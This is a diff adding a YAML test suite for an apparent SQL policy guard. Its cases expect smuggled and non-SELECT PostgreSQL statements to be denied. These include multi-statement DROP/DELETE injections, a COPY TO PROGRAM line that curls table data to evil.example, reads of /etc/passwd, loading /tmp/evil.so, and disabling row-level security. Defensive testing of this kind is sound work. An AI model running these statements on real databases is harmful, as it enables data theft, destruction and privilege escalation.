@@ -1,0 +1,309 @@
+# Threat class: statement smuggling (PLAN.md §3). Exactly one statement, and
+# only allowlisted statement kinds (saas policy: select only).
+# Policy: saas.yaml (bound tenancy, require_limit 1000).
+apiVersion: haltsql.dev/v1
+kind: TestSuite
+metadata: { name: statement_smuggling, description: Multi-statement and non-SELECT statement kinds }
+policy: ../fixtures/policies/saas.yaml
+defaults:
+  context: { tenant_id: acme }
+cases:
+  - name: baseline single select allowed
+    sql: SELECT id FROM orders WHERE tenant_id = $1 LIMIT 10
+    expect: allow
+    bind: [{ param: 1, value: acme }]
+    tags: [statement_smuggling, baseline]
+  - name: trailing semicolon is still one statement
+    sql: SELECT id FROM orders WHERE tenant_id = $1 LIMIT 10;
+    expect: allow
+    bind: [{ param: 1, value: acme }]
+    tags: [statement_smuggling]
+  - name: trailing semicolon and whitespace
+    sql: "SELECT id FROM orders WHERE tenant_id = $1 LIMIT 10 ;  \n"
+    expect: allow
+    bind: [{ param: 1, value: acme }]
+    tags: [statement_smuggling]
+  - name: select then drop table
+    sql: SELECT 1; DROP TABLE x
+    expect: deny
+    codes: [E_MULTI_STATEMENT]
+    tags: [statement_smuggling, multi]
+  - name: valid select then drop table
+    sql: SELECT id FROM orders WHERE tenant_id = $1 LIMIT 10; DROP TABLE orders
+    expect: deny
+    codes: [E_MULTI_STATEMENT]
+    tags: [statement_smuggling, multi]
+  - name: two valid selects
+    sql: SELECT id FROM orders WHERE tenant_id = $1 LIMIT 10; SELECT id FROM orders WHERE tenant_id = $1 LIMIT 10
+    expect: deny
+    codes: [E_MULTI_STATEMENT]
+    tags: [statement_smuggling, multi]
+  - name: select then delete
+    sql: SELECT id FROM orders WHERE tenant_id = $1 LIMIT 10; DELETE FROM orders
+    expect: deny
+    codes: [E_MULTI_STATEMENT]
+    tags: [statement_smuggling, multi]
+  - name: select then update on newline
+    sql: |-
+      SELECT id FROM orders WHERE tenant_id = $1 LIMIT 10;
+      UPDATE orders SET status = 'void'
+    expect: deny
+    codes: [E_MULTI_STATEMENT]
+    tags: [statement_smuggling, multi]
+  - name: double semicolon then statement
+    sql: SELECT id FROM orders WHERE tenant_id = $1 LIMIT 10;; TRUNCATE orders
+    expect: deny
+    codes: [E_MULTI_STATEMENT]
+    tags: [statement_smuggling, multi]
+  - name: three statements
+    sql: SELECT 1; SELECT 2; SELECT 3
+    expect: deny
+    codes: [E_MULTI_STATEMENT]
+    tags: [statement_smuggling, multi]
+  - name: select then set role
+    sql: SELECT id FROM orders WHERE tenant_id = $1 LIMIT 10; SET ROLE postgres
+    expect: deny
+    codes: [E_MULTI_STATEMENT]
+    tags: [statement_smuggling, multi]
+  - name: begin wrapper around select
+    sql: BEGIN; SELECT id FROM orders WHERE tenant_id = $1 LIMIT 10; COMMIT
+    expect: deny
+    codes: [E_MULTI_STATEMENT]
+    tags: [statement_smuggling, multi]
+  - name: drop table
+    sql: DROP TABLE orders
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, ddl]
+  - name: create table as
+    sql: CREATE TABLE stolen AS SELECT * FROM customers
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, ddl]
+  - name: create table
+    sql: CREATE TABLE t (id int)
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, ddl]
+  - name: alter table
+    sql: ALTER TABLE orders DISABLE ROW LEVEL SECURITY
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, ddl]
+  - name: truncate
+    sql: TRUNCATE orders
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, ddl]
+  - name: grant
+    sql: GRANT ALL ON orders TO public
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, dcl]
+  - name: revoke
+    sql: REVOKE SELECT ON orders FROM app_ro
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, dcl]
+  - name: do block
+    sql: DO $$ BEGIN PERFORM pg_sleep(10); END $$
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, do]
+  - name: empty do block
+    sql: DO $$ $$
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, do]
+  - name: do block with language
+    sql: DO LANGUAGE plpgsql $body$ BEGIN DELETE FROM orders; END $body$
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, do]
+  - name: call procedure
+    sql: CALL purge_tenant('globex')
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling]
+  - name: copy to program
+    sql: COPY orders TO PROGRAM 'curl -d @- https://evil.example'
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, copy]
+  - name: copy query to stdout
+    sql: COPY (SELECT * FROM customers) TO STDOUT
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, copy]
+  - name: copy from file
+    sql: COPY orders FROM '/etc/passwd'
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, copy]
+  - name: set search_path
+    sql: SET search_path = evil, app
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, session]
+  - name: set local statement_timeout
+    sql: SET LOCAL statement_timeout = 0
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, session]
+  - name: reset all
+    sql: RESET ALL
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, session]
+  - name: show
+    sql: SHOW search_path
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, session]
+  - name: set role
+    sql: SET ROLE admin
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, session]
+  - name: set session authorization
+    sql: SET SESSION AUTHORIZATION postgres
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, session]
+  - name: listen
+    sql: LISTEN tenant_events
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling]
+  - name: notify
+    sql: NOTIFY tenant_events, 'x'
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling]
+  - name: vacuum
+    sql: VACUUM FULL orders
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, maintenance]
+  - name: analyze statement
+    sql: ANALYZE orders
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, maintenance]
+  - name: lock table
+    sql: LOCK TABLE orders IN ACCESS EXCLUSIVE MODE
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling]
+  - name: prepare
+    sql: PREPARE q AS SELECT * FROM customers
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, prepared]
+  - name: execute prepared
+    sql: EXECUTE q
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, prepared]
+  - name: deallocate
+    sql: DEALLOCATE ALL
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, prepared]
+  - name: begin
+    sql: BEGIN
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, transaction]
+  - name: commit
+    sql: COMMIT
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, transaction]
+  - name: savepoint
+    sql: SAVEPOINT s1
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, transaction]
+  - name: declare cursor
+    sql: DECLARE c CURSOR FOR SELECT id FROM orders WHERE tenant_id = $1 LIMIT 10
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, cursor]
+  - name: fetch cursor
+    sql: FETCH ALL FROM c
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, cursor]
+  - name: discard all
+    sql: DISCARD ALL
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, session]
+  - name: load library
+    sql: LOAD '/tmp/evil.so'
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling]
+  - name: checkpoint
+    sql: CHECKPOINT
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, maintenance]
+  - name: create extension
+    sql: CREATE EXTENSION dblink
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, ddl]
+  - name: create function
+    sql: CREATE FUNCTION f() RETURNS int LANGUAGE sql AS 'SELECT 1'
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, ddl]
+  - name: alter system
+    sql: ALTER SYSTEM SET log_statement = 'none'
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, ddl]
+  - name: comment on
+    sql: COMMENT ON TABLE orders IS 'pwned'
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, ddl]
+  - name: refresh materialized view
+    sql: REFRESH MATERIALIZED VIEW sales_mv
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, ddl]
+  - name: create rule
+    sql: CREATE RULE r AS ON SELECT TO orders DO INSTEAD SELECT * FROM customers
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, ddl]
+  - name: insert on select only policy
+    sql: INSERT INTO orders (id, tenant_id) VALUES (1, $1)
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, dml]
+  - name: update on select only policy
+    sql: UPDATE orders SET status = 'void' WHERE tenant_id = $1
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, dml]
+  - name: delete on select only policy
+    sql: DELETE FROM orders WHERE tenant_id = $1
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, dml]
+  - name: merge statement
+    sql: |-
+      MERGE INTO orders o USING customers c ON o.customer_id = c.id
+      WHEN MATCHED THEN DELETE
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, dml]
+  - name: reindex
+    sql: REINDEX TABLE orders
+    expect: deny
+    codes: [E_STATEMENT_KIND]
+    tags: [statement_smuggling, maintenance]
